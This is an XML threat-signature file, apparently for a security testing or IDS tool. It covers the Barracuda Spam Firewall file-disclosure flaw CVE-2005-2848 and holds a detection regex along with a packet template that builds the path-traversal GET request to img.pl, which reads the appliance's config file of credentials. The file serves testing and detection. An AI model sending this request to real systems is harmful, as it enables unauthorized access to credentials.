@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Barracuda Email Firewall File Disclosure"/>
+    <EngDesc display="true" value="The Barracuda Email Firewall allows a user to download an arbitrary file off of the appliance.  This allows the attacker to read configuration files pertinent to the appliance, including usernames and passwords.  The Barracuda management system is web based on port 8000."/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+      <item value="Scoping"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Network_Appliance"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Barracuda_Networks"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Barracuda_Networks_Spam_Firewall"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Barracuda_Networks_Spam_Firewall_3.1.17"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1"/>
+    <CVEID display="true" value="CVE-2005-2848"/>
+    <bugtraqID display="true" value="14710"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="fea7cdcfb361beaac3aa1a16e2f6d497"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725861880312500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="[Gg][Ee][Tt]\X20[/][Cc][Gg][Ii][-][Bb][Ii][Nn][/][Ii][Mm][Gg][.][Pp][Ll][?][Ff][=][.][.][/][Hh][Oo][Mm][Ee][/][Ee][Mm][Aa][Ii][Ll][Ss][Ww][Ii][Tt][Cc][Hh][/][Cc][Oo][Dd][Ee][/][Cc][Oo][Nn][Ff][Ii][Gg][/][Cc][Uu][Rr][Rr][Ee][Nn][Tt][.][Cc][Oo][Nn][Ff]\X20[Hh][Tt][Tt][Pp][/][1][.][0]"/>
+    <Created value="1155320262" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4="">
+          <HTTP Method="GET" Request-URI="/cgi-bin/img.pl?f=../home/emailswitch/code/config/current.conf" HTTP-Version="HTTP/1.0"/>
+        </TCP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
